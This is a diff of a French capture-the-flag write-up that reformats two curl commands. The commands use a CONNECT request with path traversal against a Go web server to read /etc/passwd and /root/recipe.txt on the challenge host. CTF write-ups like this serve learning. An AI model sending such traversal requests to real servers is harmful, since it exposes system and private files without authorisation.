@@ -25,12 +25,16 @@ A la connexion sur cette URL, on tombe sur la page **index.hmtl** avec le code s
 </html>
 ```
 
-On se doutes donc qu'il faut accéder à un fichier dans le répertoire **/root**.
+On se doute donc qu'il faut accéder à un fichier dans le répertoire **/root**.
 
 Il existe un exploit qui permet d'accéder à des ressources non-autorisées grâce à une requête CONNECT sur des serveurs web en Golang.
 
-J'essaye dans un premier temps d'accéder au fichier **/etc/passwd** via curl : `curl --path-as-is -X CONNECT chal2.pctf.competitivecyber.club:49515/../../..
-/etc/passwd`
+J'essaye dans un premier temps d'accéder au fichier **/etc/passwd** via curl : 
+
+```
+curl --path-as-is -X CONNECT chal2.pctf.competitivecyber.club:49515/../../..
+/etc/passwd
+```
 
 Via la requête, j'accède bien au fichier souhaité :
 
@@ -40,7 +44,11 @@ Ceci dit, impossible d'exécuter une commande pour lister le contenu du réperto
 
 Après relecture ducode source HTML, je découvre l'existence du fichier recipe.txt. 
 
-Je relance donc ma commande curl avec le chemin complet et je récupère le contenu : `curl --path-as-is -X CONNECT chal2.pctf.competitivecyber.club:49515/../../../root/recipe.txt`
+Je relance donc ma commande curl avec le chemin complet et je récupère le contenu : 
+
+```
+curl --path-as-is -X CONNECT chal2.pctf.competitivecyber.club:49515/../../../root/recipe.txt
+```
 
 ![image](https://user-images.githubusercontent.com/49941629/166076128-1acaa89b-ad4e-4c55-900e-5062165d01f0.png)
 
